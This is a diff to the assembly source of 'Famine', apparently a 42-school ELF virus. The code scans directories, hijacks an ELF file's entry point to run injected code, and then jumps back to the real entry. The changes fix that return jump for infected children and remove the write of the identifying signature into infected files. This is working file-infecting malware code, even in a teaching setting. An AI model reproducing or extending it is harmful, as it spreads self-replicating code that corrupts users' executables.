@@ -4,7 +4,7 @@ sc:
 				push			rbp
 				mov				rbp,					rsp
 
-				mov				rbx,					12 * 8 + 3 * 1024
+				mov				rbx,					13 * 8 + 3 * 1024
 				sub				rsp,					rbx					; glob @ +24
 
 				push			rdi
@@ -20,7 +20,7 @@ sc:
 				inc				rcx
 				jmp				.loop
 .end:
-				mov				rdi,					qword[rel sc_entry]
+				lea				rdi,					[rel sc]
 				add				rdi,					sc_end - sc
 				and				rdi,					0xfffffffffffff000
 				mov				rsi,					sc_data_end - sc_data
@@ -39,6 +39,8 @@ sc:
 				mov				qword[rsp+0x30+24],		rax
 				mov				rax,					qword[rel sc_real_entry]
 				mov				qword[rsp+0xc70+24],	rax
+				mov				rax,					qword[rel sc_child]
+				mov				qword[rsp+0xc78+24],	rax
 
 				lea				rdi,					[rel sc_dir_1]
 				call			sc_proc_dir
@@ -52,9 +54,15 @@ sc:
 
 				mov				rax,					qword[rsp+0xc70]
 
+				cmp				qword[rsp+0xc78],		0
+				je				.parent
+				
+				lea				r8,						[rel sc]
+				sub				r8,						qword[rel sc_entry]
+				add				rax,					r8
+.parent:
 				mov				rsp,					rbp
 				pop				rbp
-				
 				jmp				rax
 sc_proc_dir:
 				push			rbp
@@ -190,7 +198,9 @@ sc_update_mem:
 				mov				qword[rel sc_entry],	rdx
 				
 				mov				rdx,					qword[r9+0x18]
-				mov				qword[rel sc_real_entry],	rdx
+				mov				qword[rel sc_real_entry], rdx
+
+				mov				qword[rel sc_child],	1
 				
 				mov				rdx,					qword[rel sc_entry]
 				mov				qword[r9+0x18],			rdx
@@ -426,20 +436,11 @@ sc_write_mem:
 				mov				qword[rsp+0x40],		rdx
 				mov				rax,					1
 				syscall
-
-				cmp				rax,					qword[rsp+0x40]
-				jne				.close
-
-				mov				rdi,					qword[rsp]
-				lea				rsi,					[rel sc_sign]
-				mov				rdx,					49
-				mov				rax,					1
-				syscall
- .close:
+.close:
  				mov				rdi,					qword[rsp]
 				mov				rax,					3
 				syscall
- .end:
+.end:
  				mov				rsp,					rbp	
 				pop				rbp
 				ret
@@ -631,6 +632,8 @@ sc_sign:
 				db				"Famine (42 project) - 2022 - by apitoise & fcadet", 0
 sc_ident:
 				db				0x7f, "ELF", 0x2
+sc_child:
+				dq				0
 sc_glob:
 				dq				0	; +0x18 -> sz.mem
 									; +0x20 -> sz.code
@@ -650,6 +653,7 @@ sc_glob:
 									; +0xc60 -> *mem
 									; +0xc68 -> x_pad
 									; +0xc70 -> real_entry
+									; +0xc78 -> child
 sc_data_end:
 
 sc_first_real_entry:
